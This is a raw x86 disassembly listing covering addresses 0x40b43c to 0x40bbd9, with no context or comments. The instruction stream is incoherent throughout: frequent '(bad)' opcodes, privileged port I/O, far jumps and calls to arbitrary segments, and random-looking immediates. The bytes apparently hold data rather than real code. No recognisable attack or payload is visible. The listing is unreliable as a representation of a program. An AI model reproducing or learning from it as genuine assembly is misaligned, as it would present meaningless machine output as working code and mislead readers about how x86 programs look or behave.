  40b43c:	mov    ds,WORD PTR [eax]
  40b43e:	aam    0xd0
  40b440:	xor    ah,ch
  40b442:	sbb    ah,bl
  40b444:	cdq    
  40b445:	push   cs
  40b446:	dec    eax
  40b447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b448:	push   0xfacb720
  40b44d:	dec    edx
  40b44e:	add    DWORD PTR [esi],edi
  40b450:	jb     0x40b471
  40b452:	jp     0x40b478
  40b454:	pop    edx
  40b455:	sub    DWORD PTR [bx+si],ecx
  40b458:	(bad)  
  40b459:	and    bh,ch
  40b45b:	mov    dl,0x7d
  40b45d:	pop    esp
  40b45e:	mov    cl,0x92
  40b460:	mov    ah,0x94
  40b462:	pop    ss
  40b463:	(bad)  
  40b464:	pop    ds
  40b465:	test   BYTE PTR [esi+eiz*8-0x7d],0xef
  40b46a:	xchg   dh,al
  40b46c:	(bad)  
  40b46d:	add    BYTE PTR [edx+edx*1],cl
  40b470:	fsubr  DWORD PTR [edx]
  40b472:	(bad)  [ebx]
  40b474:	lock popf 
  40b476:	dec    ebx
  40b477:	call   0x2dab8980
  40b47c:	fist   DWORD PTR [edx+0x26fc2a0e]
  40b482:	jp     0x40b4c0
  40b484:	leave  
  40b485:	dec    ebx
  40b486:	ror    DWORD PTR [eax],cl
  40b488:	cmp    eax,0x463a4a7e
  40b48d:	and    DWORD PTR [ecx],esi
  40b48f:	and    edi,DWORD PTR [ecx-0x32605e72]
  40b495:	clc    
  40b496:	out    dx,al
  40b497:	mov    eax,gs:0x751375b0
  40b49d:	or     bh,BYTE PTR [esi+0x4f]
  40b4a0:	sbb    eax,0x6db7c1f0
  40b4a5:	dec    ebp
  40b4a6:	ret    
  40b4a7:	pop    edx
  40b4a8:	mov    eax,0xce8ec501
  40b4ad:	push   ecx
  40b4ae:	push   es
  40b4af:	add    al,0x6d
  40b4b1:	fwait
  40b4b2:	jge    0x40b47a
  40b4b4:	add    BYTE PTR [ebp-0x5c1ceefb],bh
  40b4ba:	test   DWORD PTR [ebp-0x22],esi
  40b4bd:	inc    eax
  40b4be:	popf   
  40b4bf:	add    BYTE PTR ds:0x130b0b37,al
  40b4c5:	xchg   edi,eax
  40b4c6:	loop   0x40b4d5
  40b4c8:	pop    esi
  40b4c9:	in     al,0xed
  40b4cb:	and    al,0x50
  40b4cd:	imul   edi,DWORD PTR [edx],0x7e4701fb
  40b4d3:	mov    edi,0xb4dd3327
  40b4d8:	pop    eax
  40b4d9:	jb     0x40b503
  40b4db:	fsubr  QWORD PTR [ecx]
  40b4dd:	cmp    BYTE PTR [esi],dh
  40b4df:	in     al,dx
  40b4e0:	cmp    ah,bh
  40b4e2:	add    DWORD PTR [ecx],ebx
  40b4e4:	mov    al,ds:0xc9823f0e
  40b4e9:	pop    ebx
  40b4ea:	retf   
  40b4eb:	imul   esp,edi,0x27
  40b4ee:	les    esi,FWORD PTR [eax]
  40b4f0:	lods   al,BYTE PTR ds:[esi]
  40b4f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4f2:	sar    DWORD PTR [eax+0x7179acf3],1
  40b4f8:	jb     0x40b510
  40b4fa:	jg     0x40b555
  40b4fc:	dec    esp
  40b4fd:	retf   
  40b4fe:	stos   BYTE PTR es:[edi],al
  40b4ff:	mov    dh,0xdb
  40b501:	pop    ebx
  40b502:	imul   esi,DWORD PTR [ecx+0x7061ae08],0x83d30505
  40b50c:	cmp    al,0xb8
  40b50e:	rol    BYTE PTR [eax-0x46c3b00c],1
  40b514:	adc    al,0x88
  40b516:	iret   
  40b517:	xchg   DWORD PTR [eax-0x10],edi
  40b51a:	adc    edx,DWORD PTR [ebx-0x7f434c8d]
  40b520:	sub    eax,0x59f0e576
  40b525:	or     DWORD PTR ds:0x4a13502b,ebp
  40b52b:	mov    dh,0x7f
  40b52d:	out    dx,al
  40b52e:	mov    edx,0x60d71ff5
  40b533:	gs (bad) 
  40b535:	xor    edx,DWORD PTR [ebx-0x78]
  40b538:	xchg   dl,cl
  40b53a:	imul   bl
  40b53c:	out    dx,eax
  40b53d:	jge    0x40b576
  40b53f:	mov    esi,0x241ad1c7
  40b544:	lea    esi,[edi-0x162a3c38]
  40b54a:	bnd jne 0x40b540
  40b54d:	lahf   
  40b54e:	adc    al,0x4
  40b550:	xchg   ecx,eax
  40b551:	and    eax,ebp
  40b553:	in     eax,0xe
  40b555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b556:	and    eax,0xb16e7f6b
  40b55b:	test   cl,ch
  40b55d:	xchg   DWORD PTR [ebp+0x0],ebp
  40b560:	xor    ebx,esi
  40b562:	dec    esp
  40b563:	inc    edx
  40b564:	push   eax
  40b565:	pop    ebp
  40b566:	xchg   ebp,eax
  40b567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b568:	and    esi,ebx
  40b56a:	and    al,0x87
  40b56c:	cli    
  40b56d:	fs inc ecx
  40b56f:	mov    edi,0x393a5d37
  40b574:	jl     0x40b5dd
  40b576:	rcl    BYTE PTR [edi-0x22],0xd
  40b57a:	fisub  WORD PTR es:[edi-0x49]
  40b57e:	push   ebx
  40b57f:	repnz adc DWORD PTR [ebp+0x2],ebp
  40b583:	not    esi
  40b585:	jmp    0x9206:0x139c29d
  40b58c:	gs and al,0xba
  40b58f:	mov    BYTE PTR [ebx-0x48620c93],al
  40b595:	or     BYTE PTR [ecx-0x2501e994],ah
  40b59b:	mov    dh,0xa1
  40b59d:	xchg   DWORD PTR [esi+0x28442cde],ecx
  40b5a3:	imul   eax,DWORD PTR [ebx+eiz*4+0xa712812],0xdbcd8077
  40b5ae:	mov    ds:0x56ad14d1,al
  40b5b3:	aaa    
  40b5b4:	sub    eax,0x343b4d25
  40b5b9:	pop    edi
  40b5ba:	pop    ebp
  40b5bb:	in     eax,dx
  40b5bc:	sti    
  40b5bd:	jl     0x40b5d1
  40b5bf:	xchg   BYTE PTR [esi+0x1f1c1da9],al
  40b5c5:	or     DWORD PTR [ebx-0x2a49004b],edi
  40b5cb:	pop    ebp
  40b5cc:	adc    dh,dl
  40b5ce:	xor    dh,cl
  40b5d0:	call   0xc82b:0xe8f1e47
  40b5d7:	daa    
  40b5d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5d9:	(bad)  
  40b5db:	push   edx
  40b5dc:	or     al,0x98
  40b5de:	xchg   BYTE PTR [ebx],ah
  40b5e0:	sub    DWORD PTR [edi],esp
  40b5e2:	les    esp,FWORD PTR [eax+0x2d6e7bce]
  40b5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5e9:	ds jge 0x40b624
  40b5ec:	dec    eax
  40b5ed:	pop    ds
  40b5ee:	fldcw  WORD PTR [edx-0x2fd84f9d]
  40b5f4:	das    
  40b5f5:	test   DWORD PTR [ebx+0x61],esi
  40b5f8:	mov    ch,dl
  40b5fa:	xchg   esp,eax
  40b5fb:	bound  edi,QWORD PTR [ebx+0x1bd215e7]
  40b601:	js     0x40b58e
  40b603:	pop    edi
  40b604:	mov    WORD PTR [ecx*1+0x20fc784a],fs
  40b60b:	popf   
  40b60c:	sub    bl,BYTE PTR [edx+0x4f466284]
  40b612:	in     al,dx
  40b613:	sbb    bh,BYTE PTR [eax]
  40b615:	fistp  DWORD PTR [ebx+ebx*8]
  40b618:	push   esi
  40b619:	sar    BYTE PTR [edi+0x68],0x70
  40b61d:	pop    eax
  40b61e:	repz (bad) 
  40b620:	mov    edx,0x5eee8939
  40b625:	mov    ch,0x73
  40b627:	pusha  
  40b628:	xchg   ebx,eax
  40b629:	xchg   edx,eax
  40b62a:	inc    esi
  40b62b:	sub    BYTE PTR [ebp-0x35],bl
  40b62e:	neg    BYTE PTR [edx+0x6eb867c]
  40b634:	mov    cl,0xb4
  40b636:	cmp    dh,BYTE PTR [edi+0xd]
  40b639:	push   ds
  40b63a:	add    BYTE PTR [eax-0x2a],ah
  40b63d:	shl    DWORD PTR [ebx-0x1e],0x67
  40b641:	adc    ebp,eax
  40b643:	adc    dh,BYTE PTR [ecx]
  40b645:	(bad)  
  40b646:	shr    BYTE PTR [esi],1
  40b648:	lahf   
  40b649:	cld    
  40b64a:	sub    esi,DWORD PTR [edi]
  40b64c:	mov    dl,0x10
  40b64e:	mov    ds,edi
  40b650:	push   ss
  40b651:	loop   0x40b609
  40b653:	dec    esp
  40b654:	sbb    ah,bl
  40b656:	inc    BYTE PTR [edi+0x31]
  40b659:	xor    al,0xe8
  40b65b:	mov    ebp,0x9bf5a0e9
  40b660:	sbb    dh,BYTE PTR [ecx+0x59]
  40b663:	jg     0x40b678
  40b665:	xchg   esp,eax
  40b666:	jg     0x40b5f6
  40b668:	inc    edi
  40b669:	popa   
  40b66a:	repz xchg ebx,eax
  40b66c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b66d:	jl     0x40b6cc
  40b66f:	sub    DWORD PTR ds:0x33e2113,ebx
  40b675:	test   DWORD PTR [esi+ebx*8-0x10],0xcae30015
  40b67d:	pushf  
  40b67e:	ret    
  40b67f:	pop    ss
  40b680:	fmul   DWORD PTR [edx-0x36137e68]
  40b686:	mov    ecx,0x44a80201
  40b68b:	push   cs
  40b68c:	fwait
  40b68d:	xchg   edx,eax
  40b68e:	xor    eax,0xcc7a1586
  40b693:	sub    ebp,esp
  40b695:	ret    
  40b696:	call   0xc4fc:0x52acd81b
  40b69d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b69e:	leave  
  40b69f:	pop    eax
  40b6a0:	ins    DWORD PTR es:[edi],dx
  40b6a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6a2:	push   ss
  40b6a3:	out    dx,al
  40b6a4:	jmp    0x8d83bb95
  40b6a9:	mov    ch,BYTE PTR [eax]
  40b6ab:	leave  
  40b6ac:	mov    ds:0x360ba8fc,al
  40b6b1:	sub    bl,BYTE PTR [edi+0x51]
  40b6b4:	dec    edi
  40b6b5:	sbb    BYTE PTR [ebp-0x33ee605],bh
  40b6bb:	jb     0x40b6a6
  40b6bd:	or     BYTE PTR gs:[ebx+0x61],dh
  40b6c1:	int    0x7f
  40b6c3:	in     al,0x24
  40b6c5:	gs jne 0x40b6ac
  40b6c8:	popa   
  40b6c9:	dec    eax
  40b6ca:	jb     0x40b6ea
  40b6cc:	inc    edx
  40b6cd:	add    al,0xef
  40b6cf:	cdq    
  40b6d0:	add    al,0x55
  40b6d2:	xor    al,0x1f
  40b6d4:	sbb    dh,BYTE PTR [ebp+0x16]
  40b6d7:	push   ds
  40b6d8:	pop    es
  40b6d9:	mov    bl,0x21
  40b6db:	loope  0x40b68f
  40b6dd:	popf   
  40b6de:	ror    BYTE PTR [edx+0x2c],cl
  40b6e1:	or     ebp,DWORD PTR [edi]
  40b6e3:	mov    dl,0xf2
  40b6e5:	jg     0x40b6c1
  40b6e7:	xor    BYTE PTR [eax-0x1dc99f1d],al
  40b6ed:	ins    BYTE PTR es:[edi],dx
  40b6ee:	mov    ebx,0xe10a017e
  40b6f3:	mov    eax,0x669c52ff
  40b6f8:	mov    dh,dl
  40b6fa:	movzx  ebx,WORD PTR [ebx]
  40b6fd:	pop    es
  40b6fe:	and    DWORD PTR [eax+0x2e],edx
  40b701:	or     dl,dl
  40b703:	popa   
  40b704:	inc    esi
  40b705:	adc    ah,BYTE PTR [ecx-0x67]
  40b708:	xor    al,0xb6
  40b70a:	pop    ss
  40b70b:	jnp    0x40b68e
  40b70d:	mov    ah,0xda
  40b70f:	jecxz  0x40b6f4
  40b711:	fidiv  DWORD PTR [eax-0x61]
  40b714:	test   DWORD PTR ss:[eax],edi
  40b717:	jns    0x40b6a8
  40b719:	pushf  
  40b71a:	loop   0x40b6ed
  40b71c:	and    BYTE PTR [edx+0x6588910c],al
  40b722:	mov    al,ds:0x1c4735be
  40b727:	sar    BYTE PTR ds:0x8e7e6612,1
  40b72d:	ret    
  40b72e:	cmp    ch,al
  40b730:	dec    edx
  40b731:	jo     0x40b7a7
  40b733:	dec    ebp
  40b734:	fcmovnu st,st(7)
  40b736:	sti    
  40b737:	out    0x58,al
  40b739:	jnp    0x40b6e0
  40b73b:	int    0x76
  40b73d:	leave  
  40b73e:	(bad)  
  40b73f:	addr16 dec eax
  40b741:	int3   
  40b742:	xchg   esi,eax
  40b743:	fdiv   DWORD PTR [esi]
  40b745:	adc    BYTE PTR [esi+ebp*4-0x6b],dl
  40b749:	cmp    bl,BYTE PTR [ebx+0x26]
  40b74c:	pop    ds
  40b74d:	pop    esp
  40b74e:	sub    eax,0x974bbdfe
  40b753:	sub    eax,0x8bea0e29
  40b758:	xchg   esp,eax
  40b759:	mov    edx,0x7ca43229
  40b75e:	mov    ecx,0x42f16656
  40b763:	pop    ds
  40b764:	sti    
  40b765:	lods   al,BYTE PTR ds:[esi]
  40b766:	xor    BYTE PTR [esi-0x4134cb9b],0x9c
  40b76d:	sti    
  40b76e:	scas   eax,DWORD PTR es:[edi]
  40b76f:	ins    BYTE PTR es:[edi],dx
  40b770:	leave  
  40b771:	jmp    0x40b784
  40b773:	ret    0xd5d1
  40b776:	daa    
  40b777:	popa   
  40b778:	cmp    BYTE PTR ds:0xe008a447,dh
  40b77e:	jg     0x40b769
  40b780:	cs (bad) 
  40b782:	sar    ah,1
  40b784:	push   ecx
  40b785:	imul   edx,DWORD PTR [eax+ebx*4-0x64],0xffffff87
  40b78a:	push   ecx
  40b78b:	sar    BYTE PTR [edi+0x10],0x4e
  40b78f:	daa    
  40b790:	inc    esp
  40b791:	sbb    al,0x56
  40b793:	mov    ds:0x24ae52f2,eax
  40b798:	mov    ebx,0x43932ee1
  40b79d:	jl     0x40b758
  40b79f:	add    eax,0xcda8f4b1
  40b7a4:	jae    0x40b752
  40b7a6:	fidivr DWORD PTR [eax]
  40b7a8:	dec    esi
  40b7a9:	aad    0x2
  40b7ab:	cmc    
  40b7ac:	hlt    
  40b7ad:	mov    ch,0x52
  40b7af:	out    dx,eax
  40b7b0:	ja     0x40b7d1
  40b7b2:	psubusb mm7,QWORD PTR [esi]
  40b7b5:	and    esi,DWORD PTR [eax+0x22]
  40b7b8:	add    bl,BYTE PTR [ebx-0x1eba2f8c]
  40b7be:	std    
  40b7bf:	in     eax,0xcb
  40b7c1:	aam    0xd2
  40b7c3:	add    cl,BYTE PTR [eax+0x28]
  40b7c6:	imul   esp,esi,0x41
  40b7c9:	int    0xbb
  40b7cb:	adc    al,0xd5
  40b7cd:	pop    ecx
  40b7ce:	ret    
  40b7cf:	xor    edx,DWORD PTR [ebx]
  40b7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7d2:	push   ebp
  40b7d3:	cmp    ch,BYTE PTR [ebx+ecx*1-0x4735d56c]
  40b7da:	sbb    eax,0x2c5bcac5
  40b7df:	xchg   al,bl
  40b7e1:	cli    
  40b7e2:	sbb    DWORD PTR [ebx+0x15],0xd6e2c6c2
  40b7e9:	mov    ds:0xc56ff30d,eax
  40b7ee:	adc    BYTE PTR [esi+0x1d],cl
  40b7f1:	mul    BYTE PTR [esi+0x217b70b3]
  40b7f7:	mul    DWORD PTR [eax-0x52]
  40b7fa:	xor    al,0x29
  40b7fc:	mov    BYTE PTR [ebp-0x31046f32],dl
  40b802:	sub    bh,BYTE PTR [ebx]
  40b804:	xor    esp,DWORD PTR [edx+0x64c211e1]
  40b80a:	dec    esi
  40b80b:	push   es
  40b80c:	xlat   BYTE PTR ds:[ebx]
  40b80d:	jo     0x40b81e
  40b80f:	mov    WORD PTR [ecx+0x3f],fs
  40b812:	sub    DWORD PTR [ecx-0x57ab79f2],0x391eb91b
  40b81c:	and    eax,DWORD PTR [eax]
  40b81e:	mov    bl,0x63
  40b820:	call   0xc617efb7
  40b825:	push   eax
  40b826:	inc    ebp
  40b827:	cmp    ebx,edi
  40b829:	(bad)  
  40b82a:	mov    edi,edi
  40b82c:	sbb    eax,0xc26732f6
  40b831:	xchg   ebp,eax
  40b832:	popa   
  40b833:	cmc    
  40b834:	inc    edx
  40b835:	or     BYTE PTR [eax-0x31],0x73
  40b839:	xor    BYTE PTR [ebx],ah
  40b83b:	xchg   BYTE PTR [edx],cl
  40b83d:	pop    esi
  40b83e:	fcmovnb st,st(2)
  40b840:	push   cs
  40b841:	mov    DWORD PTR [ebp-0x4a],0x10363215
  40b848:	sbb    eax,DWORD PTR [esi+0x240496fb]
  40b84e:	out    dx,eax
  40b84f:	sub    BYTE PTR [edi+0x6c481bc4],0xf9
  40b856:	addr16 and eax,0x7b4c9557
  40b85c:	lds    eax,FWORD PTR [eax]
  40b85e:	and    bh,BYTE PTR [edx+0x7a]
  40b861:	push   esi
  40b862:	ficom  WORD PTR [eax]
  40b864:	imul   esi,DWORD PTR ds:0x98cb5fed,0x6c
  40b86b:	ret    
  40b86c:	les    esp,FWORD PTR [esi+eax*8]
  40b86f:	test   eax,0x9db7cecb
  40b874:	mov    bl,0xc1
  40b876:	adc    ecx,DWORD PTR [eax-0x3ab5ea30]
  40b87c:	call   0xbb32:0x693d21ed
  40b883:	inc    eax
  40b884:	sbb    eax,0xd4bbd614
  40b889:	pop    ebx
  40b88a:	jmp    0x4293:0x3cd52b11
  40b891:	jg     0x40b90f
  40b893:	mov    eax,ds:0x1b549045
  40b898:	pop    edi
  40b899:	or     eax,0x7eb3044f
  40b89e:	push   ss
  40b89f:	out    0xb,al
  40b8a1:	xchg   edi,eax
  40b8a2:	push   0x42cc85f
  40b8a7:	mov    edx,esi
  40b8a9:	mov    al,0x2b
  40b8ab:	jmp    0xdadc:0x3e0806fb
  40b8b2:	xchg   ecx,eax
  40b8b3:	push   es
  40b8b4:	and    ecx,DWORD PTR [esp+edx*8+0x36c56ba0]
  40b8bb:	call   0xb098:0xaeb748a4
  40b8c2:	test   ecx,ebx
  40b8c4:	xchg   esi,ebx
  40b8c6:	ds pop esi
  40b8c8:	and    bh,BYTE PTR [edi+eax*1-0x1ae17290]
  40b8cf:	jnp    0x40b864
  40b8d1:	aaa    
  40b8d2:	sub    eax,DWORD PTR [ebx-0x25d512c6]
  40b8d8:	call   0xce23:0x41fffa23
  40b8df:	lahf   
  40b8e0:	mov    eax,0x988d98de
  40b8e5:	jae    0x40b8d8
  40b8e7:	imul   BYTE PTR [ebx-0x6b]
  40b8ea:	imul   BYTE PTR [ebx*1-0x4264d0ce]
  40b8f1:	pop    esp
  40b8f2:	dec    esi
  40b8f3:	and    DWORD PTR ds:0xd1ae5663,0x60dd983a
  40b8fd:	push   ebx
  40b8fe:	mov    edx,0xf40e92d1
  40b903:	xor    BYTE PTR [eax+0x12abb5a2],dh
  40b909:	push   0xffffff91
  40b90b:	push   ds
  40b90c:	bound  eax,QWORD PTR [ebx+edx*2-0x18]
  40b910:	int    0xf2
  40b912:	ins    DWORD PTR es:[edi],dx
  40b913:	xor    esi,DWORD PTR [edx]
  40b915:	(bad)  
  40b916:	push   0x47
  40b918:	jp     0x40b8f5
  40b91a:	inc    ebp
  40b91b:	in     eax,0x30
  40b91d:	adc    ch,dh
  40b91f:	adc    BYTE PTR [ebx+0x74],dl
  40b922:	aaa    
  40b923:	mov    ah,BYTE PTR [eax]
  40b925:	ins    DWORD PTR es:[edi],dx
  40b926:	test   BYTE PTR [ebp+0x21],cl
  40b929:	js     0x40b980
  40b92b:	retf   
  40b92c:	sub    DWORD PTR [ecx],edi
  40b92e:	mov    esp,0x6a886d3f
  40b933:	mov    edi,gs
  40b935:	lea    ebp,[edi-0x22971672]
  40b93b:	cdq    
  40b93c:	rcr    esi,cl
  40b93e:	mov    eax,ds:0x2f7b3ea0
  40b943:	cmp    BYTE PTR [edx-0x4f2fc288],bh
  40b949:	mov    bl,cl
  40b94b:	mov    ?,WORD PTR [ebx-0x520a84e2]
  40b951:	mov    edi,0x4acd43b
  40b956:	stc    
  40b957:	outs   dx,DWORD PTR ds:[esi]
  40b958:	out    0x56,eax
  40b95a:	ds out dx,eax
  40b95c:	jne    0x40b984
  40b95e:	cmp    eax,0x86fba37e
  40b963:	mov    cl,0xbf
  40b965:	inc    ecx
  40b966:	xchg   edx,eax
  40b967:	leave  
  40b968:	mov    esi,0x2a223db0
  40b96d:	jmp    0x745d:0x51e7085a
  40b974:	mov    eax,ds:0xa1b60714
  40b979:	out    0x6f,al
  40b97b:	jno    0x40b9cf
  40b97d:	xchg   ebp,eax
  40b97e:	outs   dx,BYTE PTR ds:[esi]
  40b97f:	sar    DWORD PTR [ecx+0x51],cl
  40b982:	cli    
  40b983:	dec    BYTE PTR [ecx+0x0]
  40b986:	inc    ebp
  40b987:	mov    cl,0xc8
  40b989:	sub    DWORD PTR [esp+ebx*8],0xffffffcb
  40b98d:	and    ah,BYTE PTR [edi]
  40b98f:	rol    DWORD PTR [esi],0x37
  40b992:	shl    BYTE PTR [ebp+0xf],cl
  40b995:	sbb    esi,0x7c
  40b998:	adc    esp,DWORD PTR [eax]
  40b99a:	enter  0x456f,0xa7
  40b99e:	xchg   esp,eax
  40b99f:	int    0x43
  40b9a1:	mov    ebx,0x41575141
  40b9a6:	mov    al,dh
  40b9a8:	loopne 0x40b9c9
  40b9aa:	mov    ds:0x7668e3af,al
  40b9af:	jle    0x40b9d3
  40b9b1:	lods   eax,DWORD PTR ds:[esi]
  40b9b2:	retf   
  40b9b3:	mov    BYTE PTR [edi],0x46
  40b9b6:	out    0x51,al
  40b9b8:	sbb    edi,DWORD PTR [eax]
  40b9ba:	fild   DWORD PTR [esi]
  40b9bc:	adc    DWORD PTR [ebx+0x1a],0x3731b692
  40b9c3:	cmc    
  40b9c4:	mov    dl,bl
  40b9c6:	call   0xfe7d866b
  40b9cb:	loope  0x40ba3d
  40b9cd:	adc    BYTE PTR [ecx-0x2806d852],bh
  40b9d3:	cmp    DWORD PTR [eax-0x38],0xb04412df
  40b9da:	adc    esp,ecx
  40b9dc:	xchg   ecx,eax
  40b9dd:	mov    esi,0x9d087b64
  40b9e2:	lds    ebx,FWORD PTR [esp+esi*8+0x3c]
  40b9e6:	mov    ah,0x9b
  40b9e8:	cmp    BYTE PTR [ebx],dl
  40b9ea:	ficom  WORD PTR [esi+edi*2]
  40b9ed:	cmp    al,0xae
  40b9ef:	and    eax,0x641f9923
  40b9f4:	lods   al,BYTE PTR ds:[esi]
  40b9f5:	lock cli 
  40b9f7:	ja     0x40ba00
  40b9f9:	mov    ss,ecx
  40b9fb:	sbb    bh,al
  40b9fd:	push   0x8a9a9962
  40ba02:	hlt    
  40ba03:	add    DWORD PTR [ecx-0x6dfdc844],ebp
  40ba09:	push   eax
  40ba0a:	aaa    
  40ba0b:	xlat   BYTE PTR ds:[ebx]
  40ba0c:	adc    al,0x98
  40ba0e:	and    al,0x8f
  40ba10:	jnp    0x40b9c5
  40ba12:	pop    ecx
  40ba13:	sti    
  40ba14:	add    DWORD PTR [esi+0x16],edi
  40ba17:	xchg   esp,eax
  40ba18:	and    bl,BYTE PTR [edx]
  40ba1a:	push   es
  40ba1b:	cmp    eax,0x4df80a59
  40ba20:	adc    DWORD PTR [ecx],0x7452c6db
  40ba26:	rcl    BYTE PTR [esi-0x1ea72a52],0xb9
  40ba2d:	es push ecx
  40ba2f:	mov    eax,0xb25f49e8
  40ba34:	test   DWORD PTR [eax+0x5d],0x77fdba2c
  40ba3b:	push   ecx
  40ba3c:	jo     0x40ba09
  40ba3e:	ds lahf 
  40ba40:	jno    0x40ba6e
  40ba42:	fadd   st,st(5)
  40ba44:	retf   0x5e6
  40ba47:	push   edx
  40ba48:	je     0x40bac4
  40ba4a:	imul   edi,DWORD PTR [ebp-0x3f1fcc49],0xffffffb0
  40ba51:	sti    
  40ba52:	jmp    0xf5ff20a5
  40ba57:	jmp    0x5e6b:0xf768ff41
  40ba5e:	scas   eax,DWORD PTR es:[edi]
  40ba5f:	pop    ss
  40ba60:	jl     0x40b9f3
  40ba62:	sbb    ebx,DWORD PTR fs:[edi+0x4d1ab7f8]
  40ba69:	xor    al,0x92
  40ba6b:	jnp    0x40badd
  40ba6d:	popa   
  40ba6e:	dec    edi
  40ba6f:	xor    eax,0x1fd009f6
  40ba74:	jno    0x40ba60
  40ba76:	mov    eax,ebp
  40ba78:	or     BYTE PTR [esi+0x4d1fdff],bh
  40ba7e:	jae    0x40ba80
  40ba80:	in     al,dx
  40ba81:	icebp  
  40ba82:	test   ah,dl
  40ba84:	jmp    0x40bae3
  40ba86:	jns    0x40ba36
  40ba88:	(bad)  [eax+0x17a925f9]
  40ba8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba8f:	inc    edi
  40ba90:	and    al,0x79
  40ba92:	scas   eax,DWORD PTR es:[edi]
  40ba93:	les    esi,FWORD PTR [eax]
  40ba95:	pop    ebx
  40ba96:	sbb    eax,0xeef0c601
  40ba9b:	pop    es
  40ba9c:	adc    eax,0x53213c4c
  40baa1:	repnz vcvtsd2ss xmm7,xmm4,QWORD PTR [esp+esi*2]
  40baa7:	(bad)
  40baaa:	ficomp DWORD PTR [esi+0x2c9039a5]
  40bab0:	adc    ah,ah
  40bab2:	mov    ecx,0xfe4d5ec1
  40bab7:	mov    es,WORD PTR [eax-0x64cf0195]
  40babd:	sub    al,0xa5
  40babf:	jp     0x40ba4f
  40bac1:	push   eax
  40bac2:	cmp    al,0x4f
  40bac4:	push   cs
  40bac5:	mov    eax,ds:0xd52b0077
  40baca:	outs   dx,BYTE PTR ds:[esi]
  40bacb:	jb     0x40baf6
  40bacd:	pop    edi
  40bace:	mov    edx,0x195c4a02
  40bad3:	adc    edx,DWORD PTR [edx+0x5ec8b95e]
  40bad9:	push   ds
  40bada:	jo     0x40bb41
  40badc:	sub    BYTE PTR [edx-0x6112c169],al
  40bae2:	iret   
  40bae3:	push   0x68
  40bae5:	inc    ebx
  40bae6:	call   0x92c758a2
  40baeb:	loopne 0x40bb00
  40baed:	sub    esi,DWORD PTR [esi-0x42]
  40baf0:	rol    DWORD PTR [eax+edx*2],cl
  40baf3:	lods   al,BYTE PTR ds:[esi]
  40baf4:	adc    DWORD PTR [esi+eiz*4+0x42],0xffffff8c
  40baf9:	jo     0x40ba91
  40bafb:	repz jmp 0x40bb72
  40bafe:	ror    DWORD PTR [ecx-0x1b84fd4a],0xc
  40bb05:	sbb    esp,ebx
  40bb07:	xchg   ecx,eax
  40bb08:	fcmove st,st(4)
  40bb0a:	or     al,0xa7
  40bb0c:	and    al,0x98
  40bb0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb0f:	push   edi
  40bb10:	test   eax,0xca69b50e
  40bb15:	(bad)  
  40bb16:	pop    eax
  40bb17:	ins    DWORD PTR es:[edi],dx
  40bb18:	out    0xa7,eax
  40bb1a:	adc    ecx,DWORD PTR [edx+0x34e1169b]
  40bb20:	sar    DWORD PTR [esi-0x2c],cl
  40bb23:	pop    ebp
  40bb24:	mov    dl,0xad
  40bb26:	fsub   QWORD PTR [ebx+0x318b59af]
  40bb2c:	cli    
  40bb2d:	adc    ch,0x2a
  40bb30:	adc    BYTE PTR [eax-0x22],al
  40bb33:	in     al,0x1e
  40bb35:	ret    0xc180
  40bb38:	int    0x4e
  40bb3a:	and    al,0x1f
  40bb3c:	aaa    
  40bb3d:	inc    eax
  40bb3e:	in     eax,dx
  40bb3f:	dec    ecx
  40bb40:	repnz add DWORD PTR [ebp-0x5b1f40bd],eax
  40bb47:	pushf  
  40bb48:	jae    0x40bb30
  40bb4a:	ins    DWORD PTR es:[edi],dx
  40bb4b:	or     DWORD PTR [edx+esi*2],0xca1a5b7e
  40bb52:	(bad)  
  40bb53:	xlat   BYTE PTR ds:[ebx]
  40bb54:	add    cl,0x39
  40bb57:	arpl   di,si
  40bb59:	or     BYTE PTR [ebx-0x6650c2cc],ah
  40bb5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb60:	inc    edi
  40bb61:	popa   
  40bb62:	push   ecx
  40bb63:	(bad)  
  40bb64:	pusha  
  40bb65:	or     DWORD PTR ss:[esi+eiz*2],esp
  40bb69:	daa    
  40bb6a:	jns    0x40bb7b
  40bb6c:	push   edi
  40bb6d:	mov    dl,BYTE PTR [edi+0x6c]
  40bb70:	sar    DWORD PTR [ebx],cl
  40bb72:	adc    al,0xc4
  40bb74:	sbb    DWORD PTR [edi+0x31c7f64],eax
  40bb7a:	mov    eax,?
  40bb7c:	add    al,0xf6
  40bb7e:	mov    dh,0x94
  40bb80:	jmp    0x289e636a
  40bb85:	add    al,0xff
  40bb87:	mov    ds:0x1672cbc,eax
  40bb8c:	fdivr  QWORD PTR [ebx+0x51ce068d]
  40bb92:	xlat   BYTE PTR ds:[ebx]
  40bb93:	jb     0x40bba3
  40bb95:	ins    BYTE PTR es:[edi],dx
  40bb96:	cmp    eax,esp
  40bb98:	test   eax,0x4b339dce
  40bb9d:	push   0x10ee6c0e
  40bba2:	jnp    0x40bb46
  40bba4:	fimul  WORD PTR [edi+esi*2]
  40bba7:	ss mov cl,0xad
  40bbaa:	test   eax,0x5504a347
  40bbaf:	xlat   BYTE PTR ds:[ebx]
  40bbb0:	sub    BYTE PTR [esi],bh
  40bbb2:	mov    eax,ds:0x9b922e1e
  40bbb7:	lock cwde 
  40bbb9:	aas    
  40bbba:	bound  eax,QWORD PTR [edi]
  40bbbc:	fbld   TBYTE PTR [esi+ecx*8+0x6567d2d4]
  40bbc3:	or     al,0x31
  40bbc5:	add    eax,0xe277def4
  40bbca:	mov    WORD PTR [ebx+ecx*2],es
  40bbcd:	test   BYTE PTR [eax],ah
  40bbcf:	xor    DWORD PTR [edx],edi
  40bbd1:	push   esp
  40bbd2:	(bad)  
  40bbd3:	push   esi
  40bbd4:	mov    esi,0x6717720e
  40bbd9:	sub    eax,0xdb8b23e6
